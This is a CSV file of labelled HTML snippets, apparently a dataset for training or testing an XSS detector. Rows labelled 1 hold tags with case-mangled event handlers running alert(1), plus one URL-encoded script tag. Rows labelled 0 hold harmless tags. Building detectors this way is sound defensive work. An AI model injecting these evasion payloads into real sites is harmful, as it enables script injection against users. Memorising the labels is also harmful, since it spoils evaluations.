payload,label
<test attr=value>,0
<img oNClick=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a OncLICk=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<test OnLoAd=alert(1)>,1
<test OnfOCus=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div onlOad=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<svg oNcLICK=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<test ONMOUSEovER=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg ONfOcUS=alert(1)>,1
<svg oNloAd=alert(1)>,1
<svg attr=value>,0
<img onLOad=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<test ONloAd=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<div oNClICk=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<test onLoaD=alert(1)>,1
<img attr=value>,0
<img onmOUsEOver=alert(1)>,1
<a oNFoCUs=alert(1)>,1
<div OnLOad=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<img onClICK=alert(1)>,1
<test oNCLiCk=alert(1)>,1
<test oNloaD=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test oNCLIck=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img OnclIcK=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img onCLIck=alert(1)>,1
<a ONmouSeOVEr=alert(1)>,1
<img oNLOad=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg oNLOAd=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg oNlOaD=alert(1)>,1
<svg OnLoAd=alert(1)>,1
<test ONFocUS=alert(1)>,1
<img attr=value>,0
<svg OnMOusEOVeR=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a ONcLICk=alert(1)>,1
<div attr=value>,0
<div ONcLiCk=alert(1)>,1
<img OncLiCk=alert(1)>,1
<img OnFoCuS=alert(1)>,1
<img attr=value>,0
<div oNFoCUs=alert(1)>,1
<test OnfOcuS=alert(1)>,1
<svg attr=value>,0
<svg onFocUs=alert(1)>,1
<svg OncLiCK=alert(1)>,1
<a attr=value>,0
<test oNfOcUS=alert(1)>,1
<svg ONfOCus=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<test ONload=alert(1)>,1
<svg ONMouSeOVEr=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<svg oNCLicK=alert(1)>,1
<test attr=value>,0
<test ONload=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<svg OncLick=alert(1)>,1
<img OnmOUSEovEr=alert(1)>,1
<img OnLoAD=alert(1)>,1
<img attr=value>,0
<img oNFocUs=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test ONlOaD=alert(1)>,1
<div oNcliCk=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a ONLoaD=alert(1)>,1
<a onloaD=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<div Onfocus=alert(1)>,1
<img oNMouSEOveR=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg oNclICk=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<svg OncLICk=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<test oNFOcuS=alert(1)>,1
<a ONFOcus=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img onLoad=alert(1)>,1
<test attr=value>,0
<svg oncLIcK=alert(1)>,1
<img attr=value>,0
<test onFocus=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test OnCLiCK=alert(1)>,1
<img OncLICk=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<a OnfOcuS=alert(1)>,1
<svg onmouSEoVEr=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test oNlOaD=alert(1)>,1
<img OnlOaD=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<test onfOcus=alert(1)>,1
<svg onMoUseOVer=alert(1)>,1
<test ONfOCuS=alert(1)>,1
<div attr=value>,0
<img oNfOcuS=alert(1)>,1
<img ONMOUsEoveR=alert(1)>,1
<test attr=value>,0
<svg ONfoCUS=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg OnfocUS=alert(1)>,1
<test OnFoCus=alert(1)>,1
<div attr=value>,0
<div ONcliCK=alert(1)>,1
<img oNMOUseover=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<a onmOuseOveR=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div onfOcuS=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div OnlOad=alert(1)>,1
<a OnMOUseOveR=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a oNClicK=alert(1)>,1
<test onloaD=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a oNMOuSEovEr=alert(1)>,1
<img attr=value>,0
<test OnCLicK=alert(1)>,1
<img onMOUseoVEr=alert(1)>,1
<a ONMouSeOVEr=alert(1)>,1
<svg onmouSEOver=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<test OnLoAd=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a oNLoaD=alert(1)>,1
<svg attr=value>,0
<a ONfoCUs=alert(1)>,1
<div ONmoUseover=alert(1)>,1
<test ONfocUs=alert(1)>,1
<svg attr=value>,0
<img ONcLICk=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div onlOaD=alert(1)>,1
<test onFOCUS=alert(1)>,1
<img ONMouseoveR=alert(1)>,1
<svg ONCLick=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<div oNMoUsEoveR=alert(1)>,1
<img ONload=alert(1)>,1
<test OnfOcUS=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img OncLICK=alert(1)>,1
<a ONCLIcK=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a onFoCus=alert(1)>,1
<svg ONclICK=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a OnCLIcK=alert(1)>,1
<svg attr=value>,0
<div oNlOAd=alert(1)>,1
<a attr=value>,0
<a onFOcuS=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg OnLoad=alert(1)>,1
<img attr=value>,0
<test OnLOAd=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<a ONMoUsEOVER=alert(1)>,1
<div onclICK=alert(1)>,1
<div OnfocUs=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<img attr=value>,0
<div attr=value>,0
<div ONfocUs=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<div ONlOAD=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<img attr=value>,0
<div OnMOuSEOvEr=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img onCliCK=alert(1)>,1
<div attr=value>,0
<test onloaD=alert(1)>,1
<svg OnfOcuS=alert(1)>,1
<img attr=value>,0
<div ONLOAD=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a OnFOCUs=alert(1)>,1
<div attr=value>,0
<div ONmOUsEoveR=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<div OnlOAd=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a ONcLick=alert(1)>,1
<a oNLOad=alert(1)>,1
<test attr=value>,0
<test oNFOcuS=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<img oNFOCUs=alert(1)>,1
<div OnFOcus=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div OnfoCUS=alert(1)>,1
<test attr=value>,0
<a onCLiCk=alert(1)>,1
<a oNCLICk=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div oNloaD=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div oNMoUsEOvEr=alert(1)>,1
<test ONmOuSEOVeR=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<a OnfoCUs=alert(1)>,1
<svg ONFoCUS=alert(1)>,1
<div oNFoCuS=alert(1)>,1
<a ONLOaD=alert(1)>,1
<img attr=value>,0
<a oNmOUSeoveR=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<a ONload=alert(1)>,1
<test attr=value>,0
<test oNLOad=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a ONfocUs=alert(1)>,1
<a attr=value>,0
<test oNfocUs=alert(1)>,1
<test attr=value>,0
<img OncliCk=alert(1)>,1
<svg attr=value>,0
<a OnLoAD=alert(1)>,1
<div attr=value>,0
<a oNmouseOVER=alert(1)>,1
<svg attr=value>,0
<div onLOAD=alert(1)>,1
<test attr=value>,0
<img OnLoAD=alert(1)>,1
<svg onmOUsEOvER=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<test onCLICK=alert(1)>,1
<img ONlOaD=alert(1)>,1
<img onFoCUs=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<svg oNFocus=alert(1)>,1
<img oNClICK=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img onloAD=alert(1)>,1
<test x=y>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div ONmOUsEOvEr=alert(1)>,1
<a attr=value>,0
<div OnLoaD=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<div ONMouSeOvER=alert(1)>,1
<div ONcLICk=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a oNFOcuS=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a onMOusEoVeR=alert(1)>,1
<svg onfOCuS=alert(1)>,1
<img attr=value>,0
<test OnloAD=alert(1)>,1
<svg attr=value>,0
<a oNLoAd=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div oNfOCUs=alert(1)>,1
<a attr=value>,0
<img oNfOCuS=alert(1)>,1
<a attr=value>,0
<div onloAd=alert(1)>,1
%3Cscript%3Ealert%281%29%3C/script%3E,1
<div attr=value>,0
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg OnfOCUS=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a OnCLICK=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<div oNlOaD=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img oNfoCUS=alert(1)>,1
<svg attr=value>,0
<a oNfocUs=alert(1)>,1
<img attr=value>,0
<a ONmOUsEoVER=alert(1)>,1
<test onMOusEoveR=alert(1)>,1
<test attr=value>,0
<svg onmOUseOver=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<img attr=value>,0
<test oNlOAd=alert(1)>,1
<a oNlOad=alert(1)>,1
<img ONFOcus=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<svg onMOUseOVer=alert(1)>,1
<div attr=value>,0
<img oNfOcUs=alert(1)>,1
<test attr=value>,0
<a oNLOaD=alert(1)>,1
<div attr=value>,0
<test ONmOUseoVer=alert(1)>,1
<a onload=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<img OnmOuseoveR=alert(1)>,1
<a OnLoAd=alert(1)>,1
<svg attr=value>,0
<test oNlOad=alert(1)>,1
<svg oNCliCK=alert(1)>,1
<img ONfOCuS=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img onMoUsEOver=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<svg ONfOcUs=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<div oNlOAd=alert(1)>,1
<svg ONMOuSEOVER=alert(1)>,1
<div oncLicK=alert(1)>,1
<a ONcLICk=alert(1)>,1
<div OnfOcuS=alert(1)>,1
<test OnMOuSEoVER=alert(1)>,1
<img onCliCK=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg oNMouSEOvER=alert(1)>,1
<div attr=value>,0
<test ONMoUseoVeR=alert(1)>,1
<a attr=value>,0
<a oNmOUseoVeR=alert(1)>,1
<test ONcLICk=alert(1)>,1
<div attr=value>,0
<test onmOuseover=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img OnMOUSEovEr=alert(1)>,1
<img oNcLICK=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img OnMOUSEovER=alert(1)>,1
<img attr=value>,0
<a OnFoCus=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<img ONload=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg oNclIcK=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test ONcliCK=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div oncLIck=alert(1)>,1
<div attr=value>,0
<img oNClICK=alert(1)>,1
<img ONfocUS=alert(1)>,1
<div oNClicK=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<a ONfOCuS=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<test attr=value>,0
<a onclIcK=alert(1)>,1
<div attr=value>,0
<img OnMOUSEoVeR=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<test onloAD=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<img onCLIck=alert(1)>,1
<div onfOCuS=alert(1)>,1
<test onFoCUs=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<a ONFOCUS=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a oNfoCUs=alert(1)>,1
<img attr=value>,0
<div ONfoCuS=alert(1)>,1
<div attr=value>,0
<img OnCLick=alert(1)>,1
<svg OnCLick=alert(1)>,1
<test OnLoad=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<div ONclICk=alert(1)>,1
<div onfocuS=alert(1)>,1
<a ONClIck=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<img oNLoAD=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<a ONLoAd=alert(1)>,1
<a onfocUS=alert(1)>,1
<test OnClIcK=alert(1)>,1
<div ONloAD=alert(1)>,1
<a onclICk=alert(1)>,1
<img ONcLiCK=alert(1)>,1
<svg attr=value>,0
<test oNMOuSEoveR=alert(1)>,1
<img attr=value>,0
<a OnfoCuS=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<test OnmOuSEOVER=alert(1)>,1
<svg ONFoCUS=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<test ONlOad=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg OnloAD=alert(1)>,1
<a attr=value>,0
<img OnMoUsEoveR=alert(1)>,1
<img ONFOcus=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<svg ONfOCus=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<test OnCLicK=alert(1)>,1
<test attr=value>,0
<test ONmouseOvEr=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a attr=value>,0
<a ONmousEOVEr=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img onLoAD=alert(1)>,1
<a oNmoUseOVER=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a oNcLICk=alert(1)>,1
<test onLoAD=alert(1)>,1
<a oNFOcuS=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img ONMoUseOVer=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test onClICK=alert(1)>,1
<img OnclICK=alert(1)>,1
<test onfOcUS=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<img onfocUs=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img ONMoUSeoVer=alert(1)>,1
<div ONMoUSEoveR=alert(1)>,1
<test onClIcK=alert(1)>,1
<a OnLOAd=alert(1)>,1
<test attr=value>,0
<div ONload=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test oncliCk=alert(1)>,1
<img oNMOUSEoVeR=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<a ONfoCuS=alert(1)>,1
<img ONmoUSeOVeR=alert(1)>,1
<div attr=value>,0
<div ONLOaD=alert(1)>,1
<test attr=value>,0
<img ONfocus=alert(1)>,1
<svg attr=value>,0
<svg OnmOUseoveR=alert(1)>,1
<a onClIcK=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img ONCLIcK=alert(1)>,1
<div attr=value>,0
<a oNFOCus=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<img onmoUsEOVER=alert(1)>,1
<test oNload=alert(1)>,1
<div attr=value>,0
<test OnfOcUs=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test OnlOad=alert(1)>,1
<svg attr=value>,0
<svg oNFOcUS=alert(1)>,1
<img ONloAd=alert(1)>,1
<test ONLOaD=alert(1)>,1
<div attr=value>,0
<svg ONfocus=alert(1)>,1
<img oNMOUSEoVeR=alert(1)>,1
<a attr=value>,0
<a oNlOAD=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg oNFocUS=alert(1)>,1
<img attr=value>,0
<div onFocUs=alert(1)>,1
<svg oNfOCus=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<a ONmOUsEOvEr=alert(1)>,1
<img OnLoAD=alert(1)>,1
<test ONFocus=alert(1)>,1
<div attr=value>,0
<div onlOAd=alert(1)>,1
<div oNloAD=alert(1)>,1
<a OnMOUSeoVeR=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg OnClicK=alert(1)>,1
<test onmOUseover=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<select name=artist>,0
<img attr=value>,0
<img onFOCUS=alert(1)>,1
<test oNMoUSEOvER=alert(1)>,1
<a attr=value>,0
<a oNLOaD=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a oNmousEOVEr=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<svg onFoCUS=alert(1)>,1
<div attr=value>,0
<svg oNmOuSeOVer=alert(1)>,1
<img onfoCus=alert(1)>,1
<svg OnFoCUs=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<div onFocUS=alert(1)>,1
<div oNlOAD=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img OnmOUSeOveR=alert(1)>,1
<img ONfOCUs=alert(1)>,1
<div attr=value>,0
<div oNlOAd=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg ONloAd=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test OnFoCUS=alert(1)>,1
<img onMouseOvEr=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<a onMoUSeoveR=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a OnLoaD=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<img oncLiCK=alert(1)>,1
<detaIlS X=y>,0
<img OnMOuSeoveR=alert(1)>,1
<img attr=value>,0
<img OnMOUseoVER=alert(1)>,1
<svg oNFoCus=alert(1)>,1
<a onmOUseoVeR=alert(1)>,1
<div onFocus=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<div OnLoAD=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a attr=value>,0
<test onfoCus=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<img attr=value>,0
<div ONmOUSEOvEr=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a oNlOAd=alert(1)>,1
<test onloaD=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test onfoCUs=alert(1)>,1
<div attr=value>,0
<a onClIck=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<div onmoUsEOvEr=alert(1)>,1
<a ONMOuseOVER=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<img OnfoCUs=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<svg ONcLick=alert(1)>,1
<svg attr=value>,0
<img onMOuseOVEr=alert(1)>,1
<a attr=value>,0
<div ONClIck=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a ONFOcUs=alert(1)>,1
<a oNFOcUS=alert(1)>,1
<img oNCliCK=alert(1)>,1
<test oNmousEovER=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<test ONCLICK=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test oNfoCus=alert(1)>,1
<a ONmousEoVEr=alert(1)>,1
<test ONCLiCK=alert(1)>,1
<a onlOaD=alert(1)>,1
<svg attr=value>,0
<div oNFocUs=alert(1)>,1
<img oNcliCK=alert(1)>,1
<div attr=value>,0
<test ONlOAD=alert(1)>,1
<a attr=value>,0
<a ONloAd=alert(1)>,1
<<details x=y>>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg OnLoaD=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img onfoCUS=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test OnMOUSEOveR=alert(1)>,1
<a attr=value>,0
<a ONmoUseOvEr=alert(1)>,1
<div attr=value>,0
<div ONMOuseOVeR=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<a OnLOAd=alert(1)>,1
<svg onload=alert(1)>,1
<img src=cat.png>,0
<a attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div OnFoCUs=alert(1)>,1
<div oNcLIcK=alert(1)>,1
<test ONFOCuS=alert(1)>,1
<div oNCLick=alert(1)>,1
<div onfocus=alert(1)>,1
<div attr=value>,0
<svg onmOusEoVER=alert(1)>,1
<div attr=value>,0
<svg onload=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a oNcLicK=alert(1)>,1
<a attr=value>,0
<img onfoCuS=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<svg oNMOUseover=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img onfocus=alert(1)>,1
<a attr=value>,0
<div onlOad=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<a onmOuseovEr=alert(1)>,1
<a OnMOUSEOVer=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img OnFOcuS=alert(1)>,1
<div onclIcK=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test ONLoad=alert(1)>,1
<test oNfoCUs=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<a oNMOUseOver=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<img oncLIcK=alert(1)>,1
<div attr=value>,0
<div onFOCus=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<img oNmOUSEOveR=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<img OnMoUSEoVER=alert(1)>,1
<div attr=value>,0
<div onFocus=alert(1)>,1
<img attr=value>,0
<img OnmoUSEoVer=alert(1)>,1
<test oNMoUsEovEr=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img OncLicK=alert(1)>,1
<svg ONMOUSeOVer=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<img onLOad=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test OnMOUSeOveR=alert(1)>,1
<div onmousEoVeR=alert(1)>,1
<img ONmOuseoVER=alert(1)>,1
<div attr=value>,0
<a oNmOuSeOvEr=alert(1)>,1
<div OnMouseovER=alert(1)>,1
<div ONLOAD=alert(1)>,1
<div oNMoUseovER=alert(1)>,1
<img OnCliCK=alert(1)>,1
<div onCLICk=alert(1)>,1
<div ONlOaD=alert(1)>,1
<div attr=value>,0
<a ONmoUSEOVeR=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img onLoAd=alert(1)>,1
<test oNFoCUS=alert(1)>,1
<a oNmouSEOVER=alert(1)>,1
<svg attr=value>,0
<test ONFOcus=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img onMouSEoVER=alert(1)>,1
<test attr=value>,0
